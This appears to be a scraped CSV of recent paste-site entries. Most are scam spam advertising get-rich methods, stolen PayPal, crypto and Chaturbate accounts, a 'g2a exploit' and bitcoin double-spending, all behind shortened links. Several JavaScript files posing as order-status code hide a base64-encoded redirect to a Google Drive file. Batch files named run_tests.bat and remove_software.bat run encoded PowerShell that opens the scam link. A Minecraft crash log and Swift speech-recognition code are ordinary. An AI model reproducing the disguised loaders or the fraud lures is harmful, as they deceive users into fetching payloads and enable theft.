id,title,username,language,date,content
K9bXnQiX,Scam Casinos and Stores,jm33,JavaScript,Tuesday 6th of May 2025 01:06:34 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 94015
31f518Sf,Order.js,x2LeaF,JavaScript,Tuesday 6th of May 2025 01:06:31 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79765/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gX78Y4BE,Make $1000 15 - MINUTES(BEGINNER) YR,enzosebah,JavaScript,Tuesday 6th of May 2025 01:06:11 AM CDT,014192 - check it out at www.tinyurl.com/new2025may
LBDi5FR8,Chaturbate with Tokens,hubertzoo90,JavaScript,Tuesday 6th of May 2025 01:05:51 AM CDT,90389 Accounts Posted On https://t.me/leakzbyeminem
F4WTen6U,Make $1000 15 - MINUTES(BEGINNER) YR,enzosebah,JavaScript,Tuesday 6th of May 2025 01:05:50 AM CDT,946013 - check it out at www.tinyurl.com/new2025may
eCgH1q8h,Make $1000 15-MINUTES  (BEGINNER) 6D,souzabeto,JavaScript,Tuesday 6th of May 2025 01:04:35 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

cKVGhYiZYr
"
KAVHnFke,run_tests.bat,ccmoi,Batch,Tuesday 6th of May 2025 12:58:10 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0ANQBmAGEANABjAGEAZAA5AA==
EXIT /b
"
h41jQWMq,EARN $900 INSTANTLY 2025 EI,souzabeto,JavaScript,Tuesday 6th of May 2025 12:57:50 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

aC1RaPsHC2
"
zawguqCL,remove_software.bat,ccmoi,Batch,Tuesday 6th of May 2025 12:57:39 AM CDT,"@ECHO OFF
TITLE $~fazoddyn: Executor v1.1
@REM ... all the other handlers ...
if %choice%==hfleak GOTO openHf

:openHf
ECHO Launching PowerShell command...
powershell -EncodedCommand UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACIAaAB0AHQAcABzADoALwAvAHQAaQBuAHkAdQByAGwALgBjAG8AbQAvAG4AZQB3ADIAMAAyADUAbQBhAHkALwAiACAAIAAjACAAaQBkAD0AYwBkAGYAOAAzADMAZgAzAA==
EXIT /b
"
g6677pBh,PayPal with Balance,enzosebah,JavaScript,Tuesday 6th of May 2025 12:55:28 AM CDT,506538 - check it out at www.tinyurl.com/new2025may
ZFL2RW4e,Doublespending using Vanity Wallet,jm33,JavaScript,Tuesday 6th of May 2025 12:51:12 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 69379
5hTKSqWc,Market.js,x2LeaF,JavaScript,Tuesday 6th of May 2025 12:51:09 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55795/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
h8QjF2P7,Make $1000 15-MINUTES  (BEGINNER) 6D,Sujeethalder,JavaScript,Tuesday 6th of May 2025 12:50:58 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

oml9pvA2FL
"
s4QXPTpV,Crypto Accounts,hubertzoo90,JavaScript,Tuesday 6th of May 2025 12:50:29 AM CDT,57420 Accounts Posted On https://t.me/leakzbyeminem
wAc03gyF,Products.js,caiphus,JavaScript,Tuesday 6th of May 2025 12:45:28 AM CDT,409495 - check it out at www.tinyurl.com/new2025may
yXE76RC5,EARN $900 INSTANTLY 2025 EI,Sujeethalder,JavaScript,Tuesday 6th of May 2025 12:44:14 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

3O7SwGeKSW
"
UySVxBRq,Untitled,Junnio,Bash,Tuesday 6th of May 2025 12:43:39 AM CDT,"[12:21:59] [Render thread/ERROR] (Minecraft) Failed to handle packet net.minecraft.network.packet.s2c.play.InventoryS2CPacket@3ffd86b9, disconnecting
 java.lang.NullPointerException: Cannot invoke ""net.minecraft.screen.ScreenHandler.onContentChanged(net.minecraft.inventory.Inventory)"" because ""this.handler"" is null
	at knot/net.minecraft.inventory.CraftingInventory.setStack(CraftingInventory.java:69) ~[minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.screen.slot.Slot.setStackNoCallbacks(Slot.java:77) ~[minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.screen.ScreenHandler.updateSlotStacks(ScreenHandler.java:904) ~[minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.client.network.ClientPlayNetworkHandler.onInventory(ClientPlayNetworkHandler.java:1315) ~[minecraft-clientOnly-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.network.packet.s2c.play.InventoryS2CPacket.apply(InventoryS2CPacket.java:59) ~[minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.network.packet.s2c.play.InventoryS2CPacket.apply(InventoryS2CPacket.java) ~[minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.network.NetworkThreadUtils.method_11072(NetworkThreadUtils.java:27) ~[minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.util.thread.ThreadExecutor.executeTask(ThreadExecutor.java:144) [minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.util.thread.ReentrantThreadExecutor.executeTask(ReentrantThreadExecutor.java:24) [minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.util.thread.ThreadExecutor.runTask(ThreadExecutor.java:118) [minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.util.thread.ThreadExecutor.runTasks(ThreadExecutor.java:107) [minecraft-common-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.client.MinecraftClient.render(MinecraftClient.java:1314) [minecraft-clientOnly-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.client.MinecraftClient.run(MinecraftClient.java:936) [minecraft-clientOnly-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at knot/net.minecraft.client.main.Main.main(Main.java:240) [minecraft-clientOnly-d1fae903ae-1.21.4-net.fabricmc.yarn.1_21_4.1.21.4+build.8-v2.jar:?]
	at net.fabricmc.loader.impl.game.minecraft.MinecraftGameProvider.launch(MinecraftGameProvider.java:480) [fabric-loader-0.16.14.jar:?]
	at net.fabricmc.loader.impl.launch.knot.Knot.launch(Knot.java:74) [fabric-loader-0.16.14.jar:?]
	at net.fabricmc.loader.impl.launch.knot.KnotClient.main(KnotClient.java:23) [fabric-loader-0.16.14.jar:?]
	at net.fabricmc.devlaunchinjector.Main.main(Main.java:86) [dev-launch-injector-0.2.1+build.8.jar:?]
"
VvTnDQSM,Make $1000 15-MINUTES (BEGINNER) OV,Sujeethalder,JavaScript,Tuesday 6th of May 2025 12:37:28 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

iuUyUnE0l0
"
PsCEqTT7,Abuse RBF in BTC transactions,jm33,JavaScript,Tuesday 6th of May 2025 12:35:50 AM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 91606
pRVPZqs7,Untitled,x2LeaF,JavaScript,Tuesday 6th of May 2025 12:35:47 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/38353/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nHH2GTZR,Products.js,caiphus,JavaScript,Tuesday 6th of May 2025 12:35:27 AM CDT,418530 - check it out at www.tinyurl.com/new2025may
8Rr8EAgr,PayPal with Balance,hubertzoo90,JavaScript,Tuesday 6th of May 2025 12:35:07 AM CDT,93620 Accounts Posted On https://t.me/leakzbyeminem
3ttYNM2d,EARN $900 INSTANTLY 2025⭐ DG,Sujeethalder,JavaScript,Tuesday 6th of May 2025 12:30:45 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

3yJYbQSoOs
"
7RTVTKET,Make $1000 15-MINUTES  (BEGINNER) 6D,Sujeethalder,JavaScript,Tuesday 6th of May 2025 12:24:00 AM CDT," 
Pdf https://tinyurl.com/freshleaks

Important: When using the g2a exploit, make sure that the script version you are using is exactly “1.7”. Higher or lower version will not work. versions are based on the update of the g2a site

xIYvbdpNCN
"
PxMX3aYw,ASR,r4j,Swift,Tuesday 6th of May 2025 12:23:51 AM CDT,"private func recognizeWithoutVAD(buffer: AVAudioPCMBuffer) {
        //        printLog(""recognize buffer"")
        if !testMode {
            guard listen, !isPlayingSpeech, !isPluginDetached else {
                return
            }
        }

        self.recognitionQueue.submitTask { [weak self] in
            // condition checking
            guard let weakSelf = self, !weakSelf.isPluginDetached,
                weakSelf.listen, !weakSelf.isPlayingSpeech
            else {
                return
            }

            MeasureService.measure(MeasureType.asr) {
                // convert buffer into ASR model (sample rate 16k)
                //                    let capacity = buffer.frameLength * AVAudioFrameCount(weakSelf.kaldiFormat!.sampleRate)
                //                              / AVAudioFrameCount(buffer.format.sampleRate)
                guard
                    let convertedBuffer = convert(
                        buffer: buffer,
                        destinationConverter: weakSelf.kaldiConverter!)
                else {
                    return
                }

                //                    printLog(""run buffer \(convertedBuffer.frameLength)"")
                let array = convertedBuffer.array()

                // save kaldi buffer for TESTING only (enable the flag)
                if weakSelf.kEnableKaldiInputSaving {
                    weakSelf.saveKaldiInputAudio(buffer: convertedBuffer)
                }

                guard let handler = weakSelf.getHandler(),
                    let vad = weakSelf.vadWrapper
                else {
                    return
                }

                let windowSize = weakSelf.kVadWindowSize
                let recognizer = handler.recognizer

                // Check if the recognizer's stream is still valid
                guard recognizer.isStreamAvailable() else {
                    printLog(""Recognizer stream is nil, skipping recognition"")
                    Crashlytics.crashlytics().log(
                        ""Recognizer stream is nil in recognize()"")
                    return
                }

                // with VAD, we need info when the person stops speaking ONLY after they spoke something
                // [no speech][speech][no speech] -> detect cases like these
                // [no speech][no speech][no speech] -> keep ignore until they say something

                if !array.isEmpty {
                    // This is just to queue the audio into the ASR buffer, but it won’t get transcribed because we don’t call asr.decode() yet,
                    // and if it’s silent/noise it’ll not be transcribed by the ASR because the VAD says its not speech.
                    let success = recognizer.acceptWaveform(samples: array)
                    if !success {
                        printLog(
                            ""Failed to accept waveform, recognizer may be finished or invalid""
                        )
                        Crashlytics.crashlytics().log(
                            ""acceptWaveform failed in recognize()"")
                        return
                    }

                    // save recording
                    if !weakSelf.testMode {
                        weakSelf.recordingTasks[weakSelf.currentRecordingId]?
                            .saveAudio(buffer: buffer)
                    }

                    while recognizer.isReady() == true {
                        recognizer.decode()
                    }

                    // decode result from model.
                    // If it is word model, just get word text
                    // For phoneme model, get phoneme tokens
                    var resultString: String
                    if weakSelf.wordMode {
                        resultString = recognizer.getResult()?.text ?? """"
                    } else {
                        let tokens = recognizer.getResult()?.tokens ?? []
                        resultString = tokens.joined(separator: "" "")
                    }
                    printLog(""resultString \(resultString)"")

                    // prevent to notify ui the same result
                    if weakSelf._lastReadResult != resultString {
                        weakSelf._lastReadResult = resultString
                        if !weakSelf.testMode {
                            weakSelf.recordingTasks[
                                weakSelf.currentRecordingId]?
                                .appendTranscript(
                                    newTranscript: resultString)
                        }
                        DispatchQueue.main.async {
                            // [resultString, endOfSpeech, isResetting]
                            // NOTE: we mark as endOfSpeech based on VAD
                            weakSelf.eventSink?([
                                ""transcript"": resultString,
                                ""wasEndpoint"": false,
                                ""resetEndPos"": false,
                                ""isVoiceActive"": true,
                            ])
                        }
                    }

                    weakSelf.hasRecognized = true

                }

            }
        }
    }"
